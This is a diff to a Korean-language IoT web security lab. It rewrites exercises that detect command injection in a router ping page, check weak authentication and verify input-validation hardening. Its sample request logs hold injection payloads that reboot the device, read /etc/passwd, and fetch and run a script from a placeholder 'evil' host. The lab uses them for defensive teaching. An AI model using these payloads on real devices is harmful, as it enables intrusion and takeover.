@@ -48,19 +48,20 @@ steps:
       > **🎯 목표:** 웹 입력이 셸 명령에 주입되는 취약점을 탐지.
       > **개념:** ping 테스트 입력에 셸 메타문자를 끼우면 임의 명령.
       ```bash
-      python3 - <<'PY'
-      import re
-      # 취약한 ping 기능: 입력을 셸에 그대로
-      def vulnerable_ping(host): return f"ping -c1 {host}"   # 검증 없음
-      inputs=["8.8.8.8", "8.8.8.8; reboot", "8.8.8.8 | cat /etc/passwd", "8.8.8.8 && wget http://evil/x.sh|sh"]
-      SHELL_META=re.compile(r"[;&|`$()]|\\n")
-      injections=[]
-      for inp in inputs:
-          cmd=vulnerable_ping(inp)
-          if SHELL_META.search(inp): injections.append(inp); print(f"  INJECTION: '{inp}' -> shell: {cmd}")
-          else: print(f"  benign: '{inp}'")
-      print("CMD_INJECTION" if len(injections)>=3 else "SAFE")
-      PY
+      # 1) IoT 라우터 진단(ping) 페이지에 들어온 요청들을 캡처한 웹 로그를 만든다(host 파라미터가 셸로 전달됨).
+      cat > /tmp/web_requests_STU42.log <<'EOF'
+      POST /cgi-bin/ping.cgi host=8.8.8.8
+      POST /cgi-bin/ping.cgi host=8.8.8.8; reboot
+      POST /cgi-bin/ping.cgi host=8.8.8.8 | cat /etc/passwd
+      POST /cgi-bin/ping.cgi host=8.8.8.8 && wget http://evil/x.sh|sh
+      EOF
+
+      # 2) host 파라미터에 셸 메타문자(; | & 등)가 든 요청을 grep 으로 찾는다(명령 주입 시도).
+      grep -nE "host=.*[;|&]" /tmp/web_requests_STU42.log
+
+      # 3) 판정: 주입 시도(메타문자 포함 요청)가 3건 이상이면 명령 주입 취약.
+      N=$(grep -cE "host=.*[;|&]" /tmp/web_requests_STU42.log)
+      [ "$N" -ge 3 ] && echo CMD_INJECTION || echo SAFE
       ```
       ✅ 마지막 줄 `CMD_INJECTION` (`;`·`|`·`&&`로 reboot·cat passwd·원격 실행 주입).
       🔎 검증 없이 입력을 셸에 넣으면 셸 메타문자(;|&&)로 임의 명령 실행. IoT의 흔한 치명적 취약점.
@@ -82,17 +83,23 @@ steps:
       > **🎯 목표:** 기본 자격·약한 세션·인증 없는 API를 평가.
       > **개념:** 인증이 약하면 그냥 접근.
       ```bash
-      python3 - <<'PY'
-      # IoT 웹 인증 상태
-      web={"default_creds":True,"session_token":"predictable(seq)","api_auth":False,"access_control":False}
-      bypasses=[]
-      if web["default_creds"]: bypasses.append("default admin/admin login")
-      if "predictable" in web["session_token"]: bypasses.append("predictable session token (hijack)")
-      if not web["api_auth"]: bypasses.append("unauthenticated API endpoints")
-      if not web["access_control"]: bypasses.append("forced browsing (no access control)")
-      for b in bypasses: print("  bypass:", b)
-      print("AUTH_BYPASS" if len(bypasses)>=3 else "SECURE")
-      PY
+      # 1) 점검한 웹 인증 상태를 기록한다(펌웨어/설정 분석 결과).
+      cat > /tmp/web_auth_STU42.txt <<'EOF'
+      default_creds=admin/admin
+      session_token=predictable(sequential)
+      api_auth=none
+      access_control=none
+      EOF
+
+      # 2) 각 인증 약점을 grep 으로 확인한다.
+      echo "[기본 자격]"; grep "default_creds=admin" /tmp/web_auth_STU42.txt
+      echo "[세션 토큰]"; grep "predictable" /tmp/web_auth_STU42.txt
+      echo "[API 인증]"; grep "api_auth=none" /tmp/web_auth_STU42.txt
+      echo "[접근 통제]"; grep "access_control=none" /tmp/web_auth_STU42.txt
+
+      # 3) 판정: 인증 우회 경로가 3개 이상이면 AUTH_BYPASS.
+      B=$(grep -cE "admin/admin|predictable|=none" /tmp/web_auth_STU42.txt)
+      [ "$B" -ge 3 ] && echo AUTH_BYPASS || echo SECURE
       ```
       ✅ 마지막 줄 `AUTH_BYPASS` (기본 자격+예측 세션+인증없는 API+강제 브라우징).
       🔎 기본 자격·예측 가능 세션·인증 없는 API·접근 통제 부재 — 각각이 인증 우회 경로.
@@ -114,22 +121,24 @@ steps:
       > **🎯 목표:** 입력검증·인증·CSRF·접근 통제로 강화.
       > **개념:** IoT도 웹 보안 기본을 지킨다.
       ```bash
-      python3 - <<'PY'
-      import re, ipaddress
-      # 입력 검증: IP 형식만 허용(셸 안 씀)
-      def safe_ping(host):
-          try: ipaddress.ip_address(host); return f"ping -c1 {host} (validated, no shell meta)"
-          except ValueError: return "REJECTED (invalid input)"
-      # 인증·CSRF·접근 통제
-      controls={"input_validation":True,"forced_cred_change":True,"csrf_token":True,"api_auth":True,"access_control":True}
-      inj=safe_ping("8.8.8.8; reboot")   # 주입 시도 거부
-      ok=safe_ping("8.8.8.8")             # 정상 통과
-      secured=all(controls.values()) and "REJECTED" in inj and "validated" in ok
-      print("injection attempt:", inj)
-      print("valid IP:", ok)
-      print("controls:", controls)
-      print("WEB_HARDENED" if secured else "CHECK")
-      PY
+      # 1) 강화된 웹 설정(입력 검증·강제 자격 변경·CSRF·API 인증·접근 통제)을 기록한다.
+      cat > /tmp/web_hardened_STU42.txt <<'EOF'
+      input_validation=ip_only(정규식 검증, 셸 미사용)
+      forced_cred_change=true
+      csrf_token=true
+      api_auth=required
+      access_control=rbac
+      EOF
+
+      # 2) 강화된 입력 검증으로 주입 시도가 거부되는지 로직을 확인한다(IP 형식만 허용).
+      for host in "8.8.8.8" "8.8.8.8; reboot"; do
+        if echo "$host" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then echo "ACCEPT: $host (유효 IP)"; else echo "REJECT: $host (형식 위반)"; fi
+      done
+
+      # 3) 판정: 5대 통제가 모두 켜지고 주입 IP 가 거부되면 강화 완료.
+      C=$(grep -cE "true|required|rbac|ip_only" /tmp/web_hardened_STU42.txt)
+      echo "8.8.8.8; reboot" | grep -qE '^[0-9.]+$' && REJ=0 || REJ=1
+      { [ "$C" -ge 5 ] && [ "$REJ" = "1" ]; } && echo WEB_HARDENED || echo CHECK
       ```
       ✅ 마지막 줄 `WEB_HARDENED` (입력 검증으로 주입 거부, 인증·CSRF·접근 통제 적용).
       🔎 입력을 IP 형식으로 엄격 검증(셸 안 씀)+기본 자격 변경+CSRF 토큰+API 인증+접근 통제. 웹 보안 기본.
